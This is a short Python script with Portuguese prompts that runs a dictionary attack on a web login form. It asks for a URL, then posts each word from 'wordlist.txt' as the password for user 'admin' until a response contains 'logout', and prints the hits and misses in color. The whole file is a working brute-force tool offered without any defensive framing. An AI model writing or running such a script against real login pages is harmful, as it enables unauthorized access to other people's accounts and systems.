import requests

url = input("Digite a url: ")

with open("wordlist.txt", "r") as file:
	wordlist = file.read().split()

for word in wordlist:

	try:

		payload = {"user": "admin", "password": word}
		response = requests.post(url, data=payload)
		
		if "logout" in response.text:
			print("\033[1;32;40m{} --> {}".format(url, word))
			break
		
		else:
			print("\033[1;31;40m{} --> {}".format(url, word))
	
	except Exception as error:
		print("Ocorreu um erro")
		print(error)